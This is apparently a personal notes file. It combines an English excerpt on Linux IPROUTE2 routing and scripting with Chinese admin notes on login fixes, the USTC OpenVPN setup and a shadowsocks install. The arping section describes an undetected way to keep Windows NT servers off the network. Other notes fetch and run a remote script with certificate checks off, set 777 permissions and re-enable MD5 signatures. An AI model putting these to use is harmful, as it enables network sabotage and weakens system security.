1. If route has a realm, destination realm of the packet is set to it.

2. If rule has a source realm, source realm of the packet is set to it.

3. If destination realm was not obtained from route and rule has destination realm, set destination realm from rule.

4. If at least one of realms is still unknown, kernel finds reversed route to the source of the packet.

5. If source realm is still unknown, get it from reversed route.

6. If one of realms is still unknown, swap realms of reversed routes and apply step 2 again.

After this procedure is completed, we know what realm the packet arrived from and the realm where it is going to propagate to. If any of the realms is unknown, it is initialized to zero (or realm unknown).

The main application of realms is in conjunction with the tc route classifier where they are used to help assign packets to traffic classes, for accounting, policing, and scheduling them according to the classification.

A much simpler but still very useful application is packet path accounting by realms. The kernel gathers a packet statistics summary which can be viewed with utility rtacct.

kuznet@amber~ $ rtacct russia

Realm BytesTo PktsTo BytesFrom PktsFrom

russia 20576778 169176 47080168 153805



This output shows that this router has received 153805 packets from realm russia and forwarded 169176 packets to russia. The realm russia consists of routes with ASPATHs not leaving russia.

Note that locally originated packets are not accounted here as rtacct shows ingoing packets only. Using the route classifier you can get even more detailed accounting information about outgoing packets, optionally summarizing traffic not only by source or destination, but by any pair of source and destination realms.

IP Utility Summary

We have presented in this section coverage of the ip utility from the IPROUTE2 utility suite. As we have shown this is the replacement under Linux for the ifconfig and route utilities for performing advanced IP network manipulation. While the standard utilities will suffice for simple setups we recommend using the ip utility instead in order to both be familiar with the usage as well as able to utilize the vast power of this utility. Linux possesses one of the most complete and powerful implementations of IP networking facilities available. We will now cover some of the basics of using the ip utility within scripts.

IP Usage in Scripting

In this section we will use what we have learned about the ip utility to create and learn from several scripts. First we will create ipup and ipdown scripts for our system. Then we will cover the operation of Alexey's ifcfg script from IPROUTE2 that uses the ip utilities to provide a stronger version of ifconfig. Finally we will cover an example of creating multiple route tables for splitting up outgoing traffic.

IPUP & IPDOWN

In this section we will create some custom networking scripts along with the core /etc/rc.d/init.d/network script using the IPROUTE2 utility suite.

First let us consider how we would manually configure the interfaces with the ip utility. The first interface is lo and it was configured under ifconfig as: ifconfig lo 127.0.0.1 netmask 255.0.0.0 broadcast 127.255.255.255. Rewriting this in ip we get two lines because of the granularity of control. So we have:

ip addr add 127.0.0.1/8 dev lo broadcast +

ip link set lo up

If we want to substitute this directly into the ipup script we would fail as the format of the configuration file, ifcfg-lo, is different from the information we need to configure the interface using ip. Also remember that the ip utility allows us to set multiple addresses on a single interface and our ipup script should allow us to take full advantage of that facility without requiring it.

To configure multiple address on our network interface we will use a loop over all the possible values of addresses within a variable. Additionally we may want to allow for renaming the device before assigning addresses so that the output of our listings makes better logical sense. So first we should think about what variables we would require in a configuration script. Then we can start writing the ipup script to take advantage of the ip utility functions and our configuration variables.

Consider the following interface configuration file:

#!/bin/sh

#>>>Device type: ethernet

#>>>Variable declarations:

DEVICE=eth0

DEVNAME=inet0

IPCIDR="192.168.1.1/24

10.3.123.1/28"

STARTME=1

#>>>End variable declarations

We have ip addresses recorded in the CIDR format that is used by the ip addr command. We have the actual kernel boot supplied interface name and also a variable for renaming the device. Finally we have the on-boot initialization switch. We want our ipup script to allow on-boot init as well as after boot init functions. Since we can define more than one IPv4 address within this configuration we need a loop function to iterate the address assignment. Combining all of these needs we get the following script.

***Begin Listing - ipup script***

#!/bin/bash

cd /etc/sysconfig/network-scripts/

. $1

if ([ $STARTME -eq 1 ] || [ "$2" = "now" ])

then

/sbin/ip link set $DEVICE down

DEV=$DEVICE

if [ -n $DEVNAME ]; then

/sbin/ip link set $DEVICE name $DEVNAME

DEV=$DEVNAME

fi

for ADDRESS in $IPCIDR

do

/sbin/ip addr add $ADDRESS broadcast + dev $DEV

done

/sbin/ip link set $DEV arp on

/sbin/ip link set $DEV up

fi

***End Listing***

Note that we allow for both changing or not changing the device name. The inner loop assigns all addresses that are listed in the IPCIDR variable to the device. Thus with a simple config file and a short ipup script we can setup our network devices with custom names and multiple addresses.

Let us take a quick look at the related ipdown script that uses the ip utility.

***Begin Listing - ipdown script***

#!/bin/bash

cd /etc/sysconfig/network-scripts/

. $1

DEV=$DEVICE

if [ -n $DEVNAME ]; then

DEV=$DEVNAME

fi

for ADDRESS in $IPCIDR

do

/sbin/ip addr del $ADDRESS dev $DEV

done

/sbin/ip link set $DEV down

/sbin/ip link set $DEV arp off

if [ -n $DEVNAME ]; then

ip link set $DEVNAME name $DEVICE

fi

***End Listing***

Note that we change the device name back to the original kernel defined name. That way we can switch between using any set of utilities we want as any particular set will restore the device to the same state as it started from.

IPNetwork Init Script

Now that we have new ipup, ipdown, and ipcfg-xxx files, let us turn our attention to the init file that runs the ipup script on system bootup. On our systems this file is called ipnetwork and resides in the /etc/rc.d/init.d/ directory. We will consider the final format of this file as it is written with the IPROUTE2 utilities in mind.

***Begin Listing - /etc/rc.d/init.d/ipnetwork***

#

# IP network Turn on/off IP networking

#

# Source function library.

. /etc/rc.d/init.d/pakinit.functions

. /etc/sysconfig/ipnetwork


cd /etc/sysconfig/network-scripts


# See how we were called.

case "$1" in

start)

pakcmd "ipup.mon" "Starting Monitor" exec /sbin/rtmon file \

/var/log/iproute.log &

pakcmd "ipup.lo" "Starting LoopBack " ./ipup ipcfg-lo

for IF in $INTERFACES ; do

for i in ipcfg-$IF[0-9]; do

pakcmd "ipup.$i" " Starting IP Interface $i " ./ipup $i

done

if [ -r ipcfg-routes ]; then

pakcmd "ipup.2" "Starting IP Static Routes " ./ipcfg-routes

fi

done

;;

stop)

for IF in $INTERFACES; do

for i in ipcfg-$IF[0-9]; do

pakcmd "ipdown.$i" "Downing IP Interface $i " ./ipdown $i

done

done

;;

*)

echo "Usage: ipnetwork {start|stop}"

exit 1

esac


exit 0

***End Listing***

We now posess a complete set of IP configuration scripts that will use the ip utility to create and destroy IP interfaces. Note that when we consider IPv6 these scripts can also be used with only minor changes. Then we will have configuration files and scripts that cover both protocols.

ifcfg script

We will now dissect a shell script provided in the IPROUTE2 package. This script is called ifcfg and Alexey wrote it as a replacement for ifconfig. Here is the full text of the script:

***Begin Listing - ifcfg script***

#! /bin/bash


CheckForwarding () {

local sbase fwd

sbase=/proc/sys/net/ipv4/conf

fwd=0

if [ -d $sbase ]; then

for dir in $sbase/*/forwarding; do

fwd=$[$fwd + `cat $dir`]

done

else

fwd=2

fi

return $fwd

}


RestartRDISC () {

killall -HUP rdisc || rdisc -fs

}


ABCMaskLen () {

local class;

class=${1%%.*}

if [ "$1" = "" -o $class -eq 0 -o $class -ge 224 ]; then return 0

elif [ $class -ge 224 ]; then return 0

elif [ $class -ge 192 ]; then return 24

elif [ $class -ge 128 ]; then return 16

else return 8; fi

}


label="label $1"

ldev="$1"

dev=${1%:*}

if [ "$dev" = "" -o "$1" = "help" ]; then

echo "Usage: ifcfg DEV [[add|del [ADDR[/LEN]] [PEER] | stop]" 1>&2

echo " add - add new address" 1>&2

echo " del - delete address" 1>&2

echo " stop - completely disable IP" 1>&2

exit 1

fi

shift


CheckForwarding

fwd=$?

if [ $fwd -ne 0 ]; then

echo "Forwarding is ON or its state is unknown ($fwd). OK, No RDISC." 1>&2

fi


deleting=0

case "$1" in

add) shift ;;

stop)

if [ "$ldev" != "$dev" ]; then

echo "Cannot stop alias $ldev" 1>&2

exit 1;

fi

ip -4 addr flush dev $dev $label || exit 1

if [ $fwd -eq 0 ]; then RestartRDISC; fi

exit 0 ;;

del*)

deleting=1; shift ;;

*)

esac


ipaddr=

pfxlen=

if [ "$1" != "" ]; then

ipaddr=${1%/*}

if [ "$1" != "$ipaddr" ]; then

pfxlen=${1#*/}

fi

if [ "$ipaddr" = "" ]; then

echo "$1 is bad IP address." 1>&2

exit 1

fi

fi

shift


peer=$1

if [ "$peer" != "" ]; then

if [ "$pfxlen" != "" -a "$pfxlen" != "32" ]; then

echo "Peer address with non-trivial netmask." 1>&2

exit 1

fi

pfx="$ipaddr peer $peer"

else

if [ "$pfxlen" = "" ]; then

ABCMaskLen $ipaddr

pfxlen=$?

fi

pfx="$ipaddr/$pfxlen"

fi


if [ "$ldev" = "$dev" -a "$ipaddr" != "" ]; then

label=

fi


if [ $deleting -ne 0 ]; then

ip addr del $pfx dev $dev $label || exit 1

if [ $fwd -eq 0 ]; then RestartRDISC; fi

exit 0

fi


if ! ip link set up dev $dev ; then

echo "Error: cannot enable interface $dev." 1>&2

exit 1

fi

if [ "$ipaddr" = "" ]; then exit 0; fi


if ! arping -q -c 2 -w 3 -D -I $dev $ipaddr ; then

echo "Error: some host already uses address $ipaddr on $dev." 1>&2

exit 1

fi


if ! ip address add $pfx brd + dev $dev $label; then

echo "Error: failed to add $pfx on $dev." 1>&2

exit 1

fi


arping -q -A -c 1 -I $dev $ipaddr

noarp=$?

( sleep 2 ;

arping -q -U -c 1 -I $dev $ipaddr ) >& /dev/null </dev/null &


ip route add unreachable 224.0.0.0/24 >& /dev/null

ip route add unreachable 255.255.255.255 >& /dev/null

if [ `ip link ls $dev | grep -c MULTICAST` -ge 1 ]; then

ip route add 224.0.0.0/4 dev $dev scope global >& /dev/null

fi


if [ $fwd -eq 0 ]; then

if [ $noarp -eq 0 ]; then

ip ro append default dev $dev metric 30000 scope global

elif [ "$peer" != "" ]; then

if ping -q -c 2 -w 4 $peer ; then

ip ro append default via $peer dev $dev metric 30001

fi

fi

RestartRDISC

fi


exit 0

***End Listing***

We will take this script apart piece by piece and explain what it is doing. At the end of this you should have a good understanding of the way an IP address can be checked for correct operation.

First off notice that there are several functions defined early in the script. The first one, CheckForwarding(), performs a check using the integer values present within the interface forwarding sysctl. The second one, RestartRDISC(), is for restarting the router discovery daemon. The third one, ABCMasqLen(), is just for making assumptions about the standard class netmask.

The script begins by assigning the first argument as the device name and then performing some error checking. If the arguments are incorrect or the help switch was provided then the usage for the command is printed out. Note from the usage statement that this command expects the netmask to be in CIDR format. If the netmask is not in CIDR format or is provided incorrectly then the class assumption is made. Having assigned the device name to the ldev variable we shift the arguments and check on our forwarding setup. If the forwarding is on we print a message and continue assigning the forwarding result to the fwd variable.

We next take up the case statement that determines what operations we will perform on the interface. In the case of add we shift arguments and continue, in the case of del we set a variable then shift and continue. The case of stop brings up a quick flush of the entire interface ip addressing. Note that on the stop routine we first check to make sure we are not dealing with legacy aliased devices. Such devices use the dev:# format and should not be used anymore due to the new multiple address structure available for IP. Note also that after we flush the interface addressing we restart the router discovery daemon if our forwarding sysctl is equal to zero. If we are running a router then we will have set the forwarding status to ensure that other devices can interoperate with us. See Chapter 4 on sysctl for more information.

In the case we are adding or deleting an interface address we continue on through checking the given address and mask length. Then we check on the peer address and determine if it is a single valued ip address. Once we pass these checks we test the netmask to determine if we can safely use it. If the netmask does not exist then we call the standard class netmask function to determine the standard class for the given ip address. This function will return the class netmask as a CIDR mask value based solely on the first octet of the address. Once we either have a defined netmask or have generated one from our address we then can define our ip address completely using CIDR format.

We have now completed parsing our arguments and now start into the actual work of manipulating the interface. We first cover the case where we are deleting the ip address from the interface. After deleting the address we again restart the router discovery daemon if our forwarding sysctl is equal to zero to ensure the update of the routing tables. If we are not deleting an address from an interface we start running the verification testing. This is where we can learn how to create better scripts for our own interface addressing.

The first test run simply verifies that the interface device can be enabled. If not then the script aborts because without a running device we cannot do any configuration of the addressing. After determining that the ip address we will use is non-null we run a duplicate address test. This is an important check to see if the address we want to use already exists on the local network. This uses the arping utility which can manipulate arp functions. This utility is very powerful and provides quite a few functions for determining and using the ip network structure. We will diverge a bit here to discuss this utility.

arping utility

The arping utility is one of several helpful ip utilities provided in the iputils package from Alexey Kuznetsov. The utilities in this package include arping, clockdiff, ping, ping6, rdisc, tracepath, tracepath6, and traceroute6. The collection should be installed on any machine where you will be running any of the advanced ip networking functions. These commands can be used to disrupt the network so caution must be exercised in their use and accessability.

Arping itself provides an IPv4 ping utility that uses ARP packets for communication. This is very usefull for manipulating arp tables on other local network devices. The arping utility can provide duplicate address testing on the local network and two types of unsolicited ARP output to enable quick updating of local network device arp tables. This latter functionality can be used to create hot standby servers on a network that allow failover of identical ip addresses to alternate devices. It can also be used to wreak havok on a local network that is not configured to prevent sabatoge.

WARNING!

If you do not understand how these functions work then we strongly reccommend that you obtain a copy of TCP/IP Illustrated Vol. 1 by W. Richard Stevens and read it. Without a firm understanding of the basic mechanisms of TCP/IP v.4 network communication most of the utilities we discuss and procedures we execute can cause severe disruption of your network.

Now that we understand what this utility provides let us return to the discussion of the ifcfg script.

We have now checked that the ip address provided on the command line is not already in use on our local networks. We now assign the ip address to the associated device and determine the correct completion of the command. Once this assignment has succesfully completed we use the unsolicited ARP mechanism of arping to update the arp caches on all of the neighboring devices. This provides instant access to our ip device from any of the local network ip devices.

WARNING!

If you have Win95/98/NT machines in your network be warned that the Windows TCP/IP network stack performs duplicate address testing incorrectly as specified by RFC-2131. Windows TCP/IP stack sends out a gratuitous ARP immediately on starting TCP/IP. This forces interruption of IP networking services if the IP address is already in use and prevents the TCP/IP stack on Windows from starting. There is no known way to workaround this fatal bug in Windows TCP/IP stacks. Do not use proxy ARP or the arping functions in a Windows TCP/IP environment.

Sadly enough the arping utility is very popular among disgruntled network people as an anonymous way of preventing NT servers from starting up. It is ridiculously simple to have the Linux machine watch for GratArp requests and issue an arping response thus preventing the NT from enabling the network card. And since ARP must be specially watched for by almost all network management systems it is rarely detected that this trick is being played. And even if you are watching you REALLY need to know what is going on as it looks "normal" for the original transaction to take place.

Quoting Alexey here as he replied to a MCSE who brought this up on LinNetDev:

"You have learned your networking from a broken pile of crap and you expect me to break my system so that you in your dumbness will be happy?"

Of course I almost did not include this here as there are enough problems in this world without purposefully baiting the stupid.. 8-} - Enough said.



Now that we have installed our address and updated the local network hosts we turn to setting up a corrected routing structure. We will first deal with routes to the multicast address class and the broadcast class. We start by sending both of these routes into the table main with a setting of host unreachable. We then test our link device for multicast capabilities. If the link is multicast enabled we allow the route for the multicast address class to be assigned to the device.

Finally we test again if the interface is forwarding. In the case of no forwarding we further test for the arp capabilities and peer addresses. If our interface has arp capabilities then we place a default route with a high metric out our device. In the case where we have a peer address then we test for the presence and insert a default route via our peer address with a somewhat high metric. In either case with no forwarding we restart router discovery as the final step.

Now that we have covered the script operation let us look at the utilities and logic behind it with an eye towards modifying our own interface address assignment scripts. First of all we will note the use of the router discovery agent. This agent is one of the reasons we stressed in the parts on ip route why you should always add a protocol level to your routes. We stressed that if you will be using ip route to add routes to the tables that you code them with protocol static to enable the kernel to know that they are valid static routes. Here is one of the reasons why this is important. Under router discovery the rdisc daemon can override routes that are non protocol tagged. So if we had just placed a default route into our table and we then start router discovery we will find that our route is not being used unless we coded the protocol. This is even more important if we will use any of the routing daemons such as zebra or gated.

Note that even in this script we need to try and use CIDR notation format for our IP addressing. This is actually a very good requirement as it speaks directly to the function of address masking. IP address masks, and IPX address masks as well, require that the mask portion be contiguous. When we write out a mask using the old style dotted decimal it is impossible to indicate the continuity of the mask. Consider the address mask 255.252.255.0. If you do not understand that masks must be contiguous then this looks like it could be a valid mask. We say that knowing that many people configuring IP systems rely on the numbers belonging to the set of good numbers. This set is: 255,254,252,248,240,224,192,128 So the assumption is that if these numbers are present then the mask must be valid. Using CIDR style notation we indicate the number of contiguous ones starting from the left in the mask. In this manner it is impossible to specify an invalid mask. Additionally you can readily see the scope of the address mask in CIDR notation thus making it easier to see where a route would be a more specific or general set of another route. So our choice of using CIDR address notation within our configuration file turns out to be the best way of specifying our addressing.

As far as considering the uses of the arping utility, as we mentioned in the warning above Microsoft Windows IPv4 stacks do not handle duplicate address detection correctly thus using arping on such a network can be problematic. We would not recommend using it except for the duplicate address detection. In our case we will not want to place it into our scripts except in cases where we know that we will need to perform duplicate address detection due to oddly configured DHCP servers and other such high levels of keyboard-seat interface errors.

Policy Routing - Multiple Route Tables Example

We will now consider what is arguably the most powerful feature in the Linux kernel routing code: The use of multiple routing tables combined with policy based routing. In the following text we will present an example of a system acting as a router for three disparate networks. We will return to this example and consider the ipchains utility in the latter half of this book where we cover Linux security and firewalls.

First off look at the diagram of the network we have under consideration:



Multiple Route Tables Network Diagram

Note that we have three external networks attached to our external ethernet interface. Each of these networks has their own router and their own IP address space that we need to use. Note that two of these address spaces overlap thus adding in a degree of complexity. We will want to setup our routing tables to allow the following connectivity.

*	All traffic from any internal network may go to the Internet

*	Traffic from Internal B may go to Network A

*	Traffic from Internal A may go to Network C

*	Traffic from Internal A Hosts 33-62 may go to Network A

*	Traffic from Internal B Hosts 65-78 may go to Network C

First we will want to setup our external IP addressing. We will setup two addresses on our DMZ ethernel interface.

***Begin Listing***

ip addr add 10.254.254.2/30 dev eth0

ip addr add 172.17.1.128/24 dev eth0

***End Listing***

Next we will cover what route tables we will want to create.

One of the best ways to look at this is to consider that policy routing enables us to determine what routing table to use for source addresses. So the rules should enable us to segment the internal networks. Then we can setup normal destination based routes within the tables. So let us create two new route tables and then discuss the ramifications of this decision.

First we will name the tables by editing the /etc/iproute2/rt_tables file. We will end up with a file that looks like the following:

***Begin Listing***

#

# reserved values

#

255 local

254 main

253 default

0 unspec

#

# Local Tables

#

1 networka

2 networkb

***End Listing***

Now we can refer to these tables in the rule commands. First we will set up the routes in each of these tables.

When you go about setting up the routes within tables there is an approach you can take which will help clarify the steps. Imagine that you are configuring a router that only has two interfaces. The outgoing interface attaches to any outbound router and the incoming interface already only has the packets you want to route. Then it is simply a matter of setting up the routing that you would want within that scope. Let us illustrate by running through the setup for table 1, networka. Here are the commands we would need to input to get the networka routing table configured:

***create networka routing table***

ip route add 10.10.0.0/16 via 10.254.254.2 table networka proto static

ip route add default via 172.17.1.254 table networka proto static

***End***

Now what is the command sequence for table networkb? Exactly.

***create networkb routing table***

ip route add 172.18.0.0/16 via 172.17.1.1 table networkb proto static

ip route add default via 172.17.1.254 table networkb proto static

***End***

Let us step back a moment and discuss why we have only two tables with three destinations. Notice that we have duplicated the destination default for the Internet into both tables. Why not place this into a third table that we will refer to? The best way to answer this is to consider the interaction between the rules and the tables. Remember that the rules define the policy based routing structure. Multiple rules may point to the same table. However once you are in a table you will need to either obtain a route or be returned via a throw route to the rule list. So if we have matched a rule we would like to assume that we have a correct match of our policy. Thus we would like all possible routes for that packet to be present in the routing table to which the packet is sent. In the case where we have three tables then we would have to have additional rules that actually need to look at the destination of the packet. But looking at the packet destination is the function of a standard route. So why have rules for every possible combination of source AND destination? By using the table we have we can create a few rules that will serve our purpose. Of course the flexibility of the system allows doing the other way around or even through granular inspection of the packets themselves. You should work through all of these scenarios for yourself and decide what works best for you. Enough theorizing, onwards to the action.

***ip rule set #1***

ip rule add from 192.168.1.32/27 to 172.18.0.0/16 pref 15000 table networka

ip rule add from 192.168.2.64/28 to 10.10.0.0/16 pref 15001 table networkb

ip rule add from 192.168.1.0/24 pref 15002 table networkb

ip rule add from 192.168.2.0/24 pref 15003 table networka

***End***

Note that we have used the preference settings to run our rules from most detailed to most general. Remember from the discussion of ip rule that there are two default rules with higher priorities present to catch whatever we do not specify here. These two default rules are very important. Think about what would happen if we forgot about those rules and specified priorities for our rules such as 65535? Would our rules ever be used?

So now consider what will happen to a packet incoming from one of our internal networks. First it will be passed through the rule priority 0 which will pass on it. Then it hits rule priority 15000. If it matches it will be routed according to table networka. If not it runs through rule 15001, then 15002, and finally 15003. Will such a packet ever continue on beyond rule priority 15003?

Now let us confuse the issue. We will redo our tables and rules from a different angle just to illustrate the range of flexibility we have to specify our routing structure.

First let us provide some details about our Linux server. Our Linux server has the following network interfaces and addresses:

eth0 - DMZ ethernet - addresses: 10.254.254.2/30, 172.17.1.128/24

eth1 - Internal A - addresses: 192.168.1.254/24

eth2 - Internal B - addresses: 192.168.2.254/24



Now we will run through the route and rule creation assuming we are starting from the beginning. First edit /etc/iproute2/rt_tables:

#/etc/iproute2/rt_tables

# reserved values

#

255 local

254 main

253 default

0 unspec

#

# Local Tables

#

1 int1

2 int2

#

Create the routes and rules.

***ip rule set #2***

ip route add 10.10.0.0/16 via 10.254.254.1 table int1 proto static

ip route add throw 0/0 table int1 proto static

ip route add 172.18.0.0/16 via 172.17.1.1 table int2 proto static

ip route add throw 0/0 table int2 proto static

ip route add 0/0 via 172.17.1.254 table main proto static

ip rule add pref 15000 table int1 iif eth1

ip rule add pref 15001 table int2 iif eth2

ip rule add pref 15002 to 10.10.0.0/16 table int1

ip rule add pref 15003 to 172.18.0.0/16 table int2

***End***

This set of routes and rules will perform the same operations as set #1. Study them until you see why. Hint: Do not forget the default rules. Later we will see how to use policy routing to perform miraculous tricks with packet paths.
*** 解压
解压缩：
1、*.tar 用 tar –xvf 解压
2、*.gz 用 gzip -d或者gunzip 解压
3、*.tar.gz和*.tgz 用 tar –xzf 解压
4、*.bz2 用 bzip2 -d或者用bunzip2 解压
5、*.tar.bz2用tar –xjf 解压
6、*.Z 用 uncompress 解压
7、*.tar.Z 用tar –xZf 解压
8、*.rar 用 unrar e解压
9、*.zip 用 unzip 解压
*** linux普通用户不能登录图形界面
问题：

普通用户(eg:administrator)不能登录linux图形界面，root用户（其他普通用户）可以登录到图形界面2

在Ubuntu登陆界面输入密码之后，黑屏一闪并且出现了check battery state之类的文字之后，又跳转到登录界面

普通用户一登录图形界面就会自动返回到KDM，但普通用户在命令行可以登陆

lightdm 循环在登陆界面

解决方案：

1.主目录下的/home/username/.Xauthority文件拥有者变成了root，从而以用户登陆的时候无法都取.Xauthority文件（推荐）
说明：Xauthority，是startx脚本记录文件。Xserver启动时，读文件~/.Xauthority,读入对应其display的记录。当一个需要显示的客户程序启动调用XOpenDisplay()也读这个文 件，并把找到的magic code 发送给Xserver。当Xserver验证这个magic code正确以后，就同意连接啦。观察startx脚本也可以看到，每次startx运行，都在调用xinit以前使用了xauth的add命令添加了一个新的记录到~/.Xauthority，用来这次运行X使用认证
1>用root账号登录【linux下添加删除修改用户 激活root登录用户 】，将.Xauthority的拥有者改为登陆用户（或者将其权限改成777或者干脆将.Xauthority删除）#chown pipi:pipi ~/.Xauthority

2>之前没有激活root账号，开机shift + ctrl + f1进入tty1,再修改(删除)/home/xxx/.Xauthority 文件，拥有者变为用户。按下shift + ctrl + F7切换回图形登陆界面登陆即可，重启

【这个问题产生原因： 手贱！在自己账户下 命令行 sudo startX
结果： 只能访问 guest session。由于 sudo startX 操作后，将 ~/.Xauthority 文件所有者改为了root， 因此只要tty命令行下登录用户，sudo chown acount:acount ~/.Xauthority 。 ctrl + alt + F7 】

Ubuntu’s documentation

2.路径的权限不对（可能是打包的时候设置的权限不对，不过具体是哪个包，需要查询）

修复如下：
chmod 755 /usr/{lib,include,share}

/tmp这个目录的权限不对，只要把这个目录的权限改成777（可以切换到普通用户上试一下能不能访问此目录即可！）

【原因：执行 rm -rf /tmp命令导致删掉tmp目录之后，系统自动重建了tmp目录，只是新建的目录权限来自于umask，其他用户没有足够的权限写入，出现此问题】

3.有没对用户home做磁盘限额呢，有的话检查下这个用户使用有没达到上限；没有做限额的话，从终端登入，把这个用户home下面有关图形的隐藏配置文件都删了（.gconf 、.gconfd、.gnome 、.gnome2、.gnome2_private 、.gstreamer-0.10 等）再试试登入看.里面有些配置文件，比如登入图形界面的时候异常关闭了，有可能导致配置信息出错，不能登入，所以让你把那些文件删了，再登入，那下文件会重新生成

要是还不行，就最暴力的方法，把用户home备份，然后把home里面的文件清空，包括隐藏文件，然后把/etc/skel目录下的隐藏文件cp到用户home下面，注意权限，如果是root cp的话，要改权限(用chown -R把修改后的home目录所有文件的所有者变成你的普通用户)，用户自己的账户cp就没关系，这样应该就可以图形登入了

4再不行就考虑别的问题.把用户目录先暂时移动的别的位置，再登陆就可以，但把原来的目录再移动回来，就又不能登陆了。

5.Your preferences files are currently in use.(If you are logged in this same account from another computer,the other login session is probably using your preferences files,)

You can choose to continue,but be aware that other login sessions may become temporarily confused.If you are not logged in elsewhere,it should be harmless to continue
Cancel Continue
Cancel退出到字符界面,Continue提示如下:
Please contact your system administrator to resolve the follow problem:
Could not resolve the address"xml:readwrite:/home/gavin/.gconf"in the configuration file"/etc/gconf/2/path"
Couldn't resolve address for configuration source:
Can't read from or write to the XML root directory in the address"xml:readwrite:/home/gavin/.gconf"
Close

from:http://blog.csdn.net/pipisorry/article/details/39755083

ref:无法登陆ubuntu图形界面，输入帐号后一闪而过。

Ubuntu输入密码登陆后又跳回到登录界面

startx analyze

mkdtemp: private socket dir:Permission denied

*** 解决无法运行Terminator出现以下问题： File "/usr/bin/terminator"...SyntaxError: invalid syntax
错误原因：语法错误．这是因为Terminator的安装或者运行需要python2的环境，但是却用python3的环境去运行Terminator了．
修改terminator的启动脚本(/usr/bin/terminator)如下：
#! /usr/bin/python2
*** vpn
https://bandwagonhost.com/
https://www.vultr.com/
**** openvpn
欢迎使用中国科学技术大学网络OpenVPN系统

OpenVPN是提供给中国科学技术大学用户从校外接入校园网的一种方式，

仅仅针对中国科学技术大学教师以及合肥以外校区学生提供，不对外提供服务。

根据有关部门要求，请登录学校统一认证系统验证身份后查看相关文档。

注意：使用VPN首先需要有具有VPN功能的网络通账号。

最新更改：
2013.09.29 增加CMCC移动出口，配置中增加reneg-sec 360000
2015.03.07 更新证书，2015年3月7日前下载过配置文件的，请重新下载下面的文件ca.crt，否则无法连接
2016.01.31 更新为2.3.10客户端，默认以管理员权限运行
2017.06.18 CentOS升级后openvpn无法连接，错误信息为"VERIFY ERROR: depth=0, error=CA signature digest algorithm too weak"
建议执行以下命令
echo -e "LegacySigningMDs md5" >> /etc/pki/tls/legacy-settings
2017.10.09 增加block-outside-dns说明
2018.11.15 登录后才能查看文档
1. 什么是VPN，为何要使用 OpenVPN
VPN可以让校外的计算机像在校内一样使用，包括使用"网络通"服务，访问文献站点。
我校提供三种从校外接入校园网的VPN服务器，分别是PPTP VPN、L2TP VPN和OpenVPN。

相关VPN说明请参见VPN说明文档

PPTP VPN不需要安装客户端，但在某些环境下无法连接，为了解决这个问题建设了OpenVPN系统。

2. 什么是OpenVPN
OpenVPN是一个开放源码的基于SSL的VPN系统，比我校使用的PPTP VPN 最大的优势在于仅仅使用UDP协议，支持从NAT设备后的连接。
OpenVPN开发站点在 www.openvpn.net。

3. 使用OpenVPN需要什么条件
3.1 使用VPN首先需要有具有VPN功能的网络通账号。
3.2 安装开放VPN客户端

开放VPN支持很多操作系统，请安装对应的客户端。

3.2 相关的配置文件: ustc-dianxin.ovpn、ustc-liantong.ovpn、ustc-cmcc.ovpn以及ca.crt。

为了方便不同网络的用户使用, 本VPN服务器同时设置了电信、联通和移动的IP地址(服务器各接口流量)
对应的IP地址为218.22.21.12、218.104.71.169和202.141.176.124,
对应的开放VPN连接分别是 ustc-dianxin 、 ustc-liantong 和 ustc-cmcc。

4. Windows 使用
1. 安装openvpn图形界面和openvpn程序
   根据操作系统版本，下载其中之一的安装文件(来自https://openvpn.net/index.php/open-source/downloads.html)并安装:

操作系统	软件
Installer (32-bit), Windows XP	openvpn-install-2.3.10-I001-i686.exe
Installer (64-bit), Windows XP	openvpn-install-2.3.10-I001-x86_64.exe
Installer (32-bit), Windows Vista and later	openvpn-install-2.3.10-I601-i686.exe
Installer (64-bit), Windows Vista and later	openvpn-install-2.3.10-I601-x86_64.exe


   安装TAP驱动的时候有个没有经过数字签名的警告,选择允许安装。

2. 把科大的openvpn配置文件openvpn.zip下载到机器临时目录，并解压出4个文件，将这4个文件拷贝到到openvpn安装目录config下面,一般是
   C:\program files\openvpn\config，也可能是C:\Program Files (x86)\OpenVPN\config

3. 到openvpn的安装目录bin下(默认是C:\program files\openvpn\bin)，找到openvpn-gui.exe, 在这个openvpn-gui.exe文件上单击鼠标右键,选择"以管理员身份运行"(英语是Run as Administrator)

4. 如果openvpn-gui已经启动，选择退出

5. 单击openvpn-gui，在右下角openvpn-gui上单击鼠标右键，根据自己所在网络，到ustc-dianxin或其他菜单中，单击"connect"可以连接vpn。

6. 有用户碰到windows10下DNS查询异常，使用如下方式解决：
   文本编辑器打开ovpn配置文件。末尾插入一行，内容为： block-outside-dns

5. Linux 使用
发信人: sh (二月：63cm/39.5cm/5kg), 信区: USTCnet
标  题: [转载]在debian下使用openvpn
发信站: 瀚海星云 (2005年03月13日21:30:37 星期天), 站内信件

1. 安装 openvpn 包
2. 下载如下文件
     http://openvpn.ustc.edu.cn/ustc-dianxin.ovpn       - Windows下的配置文件
     http://openvpn.ustc.edu.cn/ustc-liantong.ovpn       - Windows下的配置文件
     http://openvpn.ustc.edu.cn/ustc-cmcc.ovpn       - Windows下的配置文件
     http://openvpn.ustc.edu.cn/ca.crt          - 证书
3. 把ustc.ovpn中的user和group这两个选项都注释(#或;)，并指明ca的绝对路径，
   最后ustc.ovpn有用的内容如下：
client
dev tap
proto udp
remote 218.22.21.12 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca /etc/openvpn/ca.crt
comp-lzo
verb 3
auth-user-pass
4. 用root运行openvpn --config ustc.ovpn，会要求你输入VPN的用户名和密码。然后
   就会看到屏幕上大堆的信息，最后出现 Initialization Sequence Completed 的信
   息就表示已经连上了。这时ifconfig tap0和route都会显示连到了211.86网段。
5. 如果不希望每次都交互式的输入用户名和密码，就在auth-user-pass后面跟上一个
   文件名，其内容就是用户名和密码各占一行。
6. 连接成功以后不会自动回到命令行，如果这时按Ctrl-C会导致连接退出。我怀疑和
   verb参数有关。也许可以设置为0。不过重定向应该也没有问题。
**** shadowsocks
vultr.com租服务器
ssh
运行以下命令:
wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh
chmod +x shadowsocks-all.sh
./shadowsocks-all.sh 2>&1 | tee shadowsocks-all.log
选择脚本（Python、R、Go、libev），任选一个：
Which Shadowsocks server you'd select:
1.Shadowsocks-Python
2.ShadowsocksR
3.Shadowsocks-Go
4.Shadowsocks-libev
Please enter a number (default 1):
笔者选择Shadowsocks-Go，输入3......然后，输入密码和端口，笔者直接回车用默认：
You choose = Shadowsocks-Go

